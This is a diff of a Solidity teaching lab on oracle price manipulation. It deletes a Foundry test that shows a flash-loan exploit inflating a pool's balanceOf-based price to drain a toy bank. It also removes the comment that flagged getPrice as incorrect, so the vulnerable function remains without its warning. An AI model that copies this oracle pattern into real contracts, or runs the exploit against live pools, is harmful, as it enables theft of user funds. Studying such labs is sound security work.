@@ -1,76 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.18;
 
-import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
-
-contract ContractTest is Test {
-    USDa USDaContract;
-    USDb USDbContract;
-    SimplePool SimplePoolContract;
-    SimpleBank SimpleBankContract;
-
-    function setUp() public {
-        USDaContract = new USDa();
-        USDbContract = new USDb();
-        SimplePoolContract = new SimplePool(
-            address(USDaContract),
-            address(USDbContract)
-        );
-        SimpleBankContract = new SimpleBank(
-            address(USDaContract),
-            address(SimplePoolContract),
-            address(USDbContract)
-        );
-    }
-
-    function testPrice_Manipulation() public {
-        USDbContract.transfer(address(SimpleBankContract), 9000 ether);
-        USDaContract.transfer(address(SimplePoolContract), 1000 ether);
-        USDbContract.transfer(address(SimplePoolContract), 1000 ether);
-        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
-        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb
-
-        console.log(
-            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
-        );
-        emit log_named_decimal_uint(
-            "Current USDa convert rate",
-            SimplePoolContract.getPrice(),
-            18
-        );
-        console.log("Start price manipulation");
-        console.log("Borrow 500 USBa over floashloan");
-        // Let's manipulate the price since the getPrice is over the balanceOf.
-
-        SimplePoolContract.flashLoan(500 ether, address(this), "0x0");
-    }
-
-    fallback() external {
-        //flashlon callback
-
-        emit log_named_decimal_uint(
-            "Price manupulated, USDa convert rate",
-            SimplePoolContract.getPrice(),
-            18
-        ); // 1 USDa : 2 USDb
-
-        USDaContract.approve(address(SimpleBankContract), 100 ether);
-        SimpleBankContract.exchange(100 ether);
-
-        USDaContract.transfer(address(SimplePoolContract), 500 ether);
-
-        // Get the balance of USDb owned by us.
-        emit log_named_decimal_uint(
-            "Use 100 USDa to convert, My USDb balance",
-            USDbContract.balanceOf(address(this)),
-            18
-        );
-    }
-
-    receive() external payable {}
-}
 
 contract USDa is ERC20, Ownable {
     constructor() ERC20("USDA", "USDA") {
@@ -102,7 +34,6 @@ contract SimplePool {
     }
 
     function getPrice() public view returns (uint256) {
-        //Incorrect price calculation over balanceOf
         uint256 USDaAmount = USDaToken.balanceOf(address(this));
         uint256 USDbAmount = USDbToken.balanceOf(address(this));
 
